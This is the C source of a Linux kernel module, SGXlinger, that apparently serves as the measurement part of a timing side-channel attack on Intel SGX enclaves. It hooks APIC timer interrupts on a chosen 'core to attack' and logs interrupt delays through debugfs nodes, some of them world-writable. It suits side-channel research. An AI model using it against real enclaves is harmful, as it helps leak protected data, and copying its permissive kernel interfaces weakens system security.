#include <linux/module.h>    // included for all kernel modules
#include <linux/kernel.h>    // included for KERN_INFO
#include <linux/init.h>      // included for __init and __exit macros
#include <linux/vmalloc.h>   // included for vmalloc() and vfree()
#include <linux/debugfs.h>
#include "sgxlinger.h"
///------------------
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Wenjian HE");
MODULE_DESCRIPTION("SGXlinger");
#define MODULE_PREFIX "[SGXlinger] "

static int core_id = -1;
module_param(core_id, int, 0);
MODULE_PARM_DESC(core_id, "Specify which logical core to attack.");

//------------- data -------------
struct _HotData{
	struct SGXlingerDataEntry * ptr;
	u64 next_deadline_delta;
	size_t tsc_buf_idx;
	struct SGXlingerDataEntry * data;
};
static struct _HotData hotbuf __attribute__ ((aligned (64))) = {NULL,0xde17a,0,NULL};

static void warm_pages(void){
	long long i;
	if (hotbuf.data==NULL) return;
	for(i=TSC_BUF_SIZE-2;i>0;i-=(4096/sizeof(struct SGXlingerDataEntry)+1)){
		hotbuf.data[i].interrupt_delay=1;
	}
}
//- Variables in kernel --------------------
extern int kern_apic_attack_target_cpu;
extern void (*kern_apic_interrupt_hook) (u64);
extern u64 (*kern_apic_next_deadline_hook) (void);

//------------- Debugfs START -------------
static struct dentry *debugfs_dir=NULL;
// -------------
static struct dentry *fs_next_deadline=NULL;
// -------------
static struct dentry *fs_data;
static struct debugfs_blob_wrapper data_blob;
// ------------- 
static struct dentry *fs_enabled=NULL;
static int get_enabled(void *data, u64 *val){
	 *val=(kern_apic_attack_target_cpu==core_id)? 1 : 0;
	 return 0;
}
static int set_enabled(void *data, u64 val){
	if(val==1){
		kern_apic_attack_target_cpu=core_id;
	}else if(kern_apic_attack_target_cpu != -1){
		kern_apic_attack_target_cpu=-1;
		printk(KERN_INFO MODULE_PREFIX "Trace Stopped. Buffer %lu used ( %lu %% )\n",
			hotbuf.tsc_buf_idx,
			hotbuf.tsc_buf_idx*100 / TSC_BUF_SIZE
			);
	}
	return 0;
}
DEFINE_SIMPLE_ATTRIBUTE(debugfs_ops_enabled, get_enabled, set_enabled, "%llu\n");
// ------------- 
static struct dentry *fs_data_pos=NULL;
static int get_data_pos(void *data, u64 *val){
	 *val=hotbuf.tsc_buf_idx;
	 return 0;
}
static int fop_data_clear(void *data, u64 val){
	if(kern_apic_attack_target_cpu==-1 && val==0 && hotbuf.data){
		memset(hotbuf.data,0,ALLOC_AMOUNT);
		asm volatile ("mfence": : : "memory");
		hotbuf.ptr=hotbuf.data;
		hotbuf.tsc_buf_idx=0;
		printk(KERN_INFO MODULE_PREFIX "SGXlinger data cleared.\n");
		warm_pages();
		return 0;
	}else{
		return -1;
	}
}
DEFINE_SIMPLE_ATTRIBUTE(debugfs_ops_data_pos, get_data_pos, fop_data_clear, "%llu\n");

// ------------- Debugfs End-------------

//------------------------------------------
__attribute__ ((hot)) 
static void sgxlinger_apic_interrupt_hook_cb(u64 interrupt_served_tsc){
	hotbuf.ptr->interrupt_delay = interrupt_served_tsc - hotbuf.ptr->interrupt_timestamp;

	hotbuf.ptr++;
	hotbuf.tsc_buf_idx++;
	if(hotbuf.tsc_buf_idx>=TSC_BUF_SIZE){
		hotbuf.tsc_buf_idx=0;
		hotbuf.ptr=hotbuf.data;
		printk(KERN_WARNING MODULE_PREFIX "Data buffer wrap around!\n");
	}
}

__attribute__ ((hot)) 
static u64 sgxlinger_apic_next_deadline_hook_cb(void){
	hotbuf.ptr->interrupt_timestamp = (~0xf) & (rdtscp()+hotbuf.next_deadline_delta);
	return hotbuf.ptr->interrupt_timestamp;
}

//--------------------------
static int __init sgxlinger_init(void)
{
	kern_apic_interrupt_hook=NULL;
	kern_apic_next_deadline_hook=NULL;
	kern_apic_attack_target_cpu=-1;

	if(core_id<0 || sizeof(struct SGXlingerDataEntry)!=10){
		return -EINVAL;
	}

	hotbuf.data=vmalloc(ALLOC_AMOUNT);
	if(!hotbuf.data){
        printk(KERN_ALERT MODULE_PREFIX "Failed to vmalloc buffer.\n");
        goto Lvmalloc_data_fail;
    }

	debugfs_dir = debugfs_create_dir("sgxlinger", NULL);
	if(!debugfs_dir){
        printk(KERN_ALERT MODULE_PREFIX "Failed to create debugfs directory.\n");
        goto Ldebugfs_dir_fail;
    }

	data_blob.data=hotbuf.data;
	data_blob.size=ALLOC_AMOUNT;
    fs_data = debugfs_create_blob("monitor_data", 0644, debugfs_dir, & data_blob);
	if(!fs_data){
        printk(KERN_ALERT MODULE_PREFIX "Failed to create debugfs node: monitor_data.\n");
        goto Ldebugfs_dentry_fail;
    }

    hotbuf.ptr=hotbuf.data;
    hotbuf.tsc_buf_idx=0;

    fs_next_deadline = debugfs_create_u64("deadline_delta",  0666, debugfs_dir, &hotbuf.next_deadline_delta);
	if(!fs_next_deadline){
        printk(KERN_ALERT MODULE_PREFIX "Failed to create debugfs node: deadline_delta\n");
        goto Ldebugfs_dentry_fail;
    }

    fs_data_pos = debugfs_create_file("data_pos",0666, debugfs_dir, NULL, &debugfs_ops_data_pos);
	if(!fs_data_pos){
        printk(KERN_ALERT MODULE_PREFIX "Failed to create debugfs node: data_pos\n");
        goto Ldebugfs_dentry_fail;
    }

    fs_enabled = debugfs_create_file("enabled",0666, debugfs_dir, NULL, &debugfs_ops_enabled);
	if(!fs_enabled){
        printk(KERN_ALERT MODULE_PREFIX "Failed to create debugfs node: enabled\n");
        goto Ldebugfs_dentry_fail;
    }

    goto Lfeel_lucky;

Ldebugfs_dentry_fail:
	debugfs_remove_recursive(debugfs_dir);
	vfree(hotbuf.data);
Ldebugfs_dir_fail:
Lvmalloc_data_fail:
	hotbuf.data=NULL;
    return -1; // Negative return means that the module couldn't be loaded.

Lfeel_lucky:
 
	memset(hotbuf.data,0,ALLOC_AMOUNT);
	warm_pages();
	kern_apic_next_deadline_hook=sgxlinger_apic_next_deadline_hook_cb;
	kern_apic_interrupt_hook=sgxlinger_apic_interrupt_hook_cb;

    printk(KERN_INFO MODULE_PREFIX "init. rdtsc=%lld, core_id=%d, BufSize=%lu\n",
            rdtsc(),
			core_id,
			TSC_BUF_SIZE
			);

    return 0;   
}

static void __exit sgxlinger_cleanup(void)
{
	kern_apic_attack_target_cpu=-1;
	debugfs_remove(fs_enabled);
	kern_apic_attack_target_cpu=-1;
	kern_apic_next_deadline_hook=NULL;
	kern_apic_interrupt_hook=NULL;

	debugfs_remove_recursive(debugfs_dir);
	vfree(hotbuf.data);

    printk(KERN_INFO MODULE_PREFIX "Unloaded.\n");
}

//--------------------------
module_init(sgxlinger_init);
module_exit(sgxlinger_cleanup);

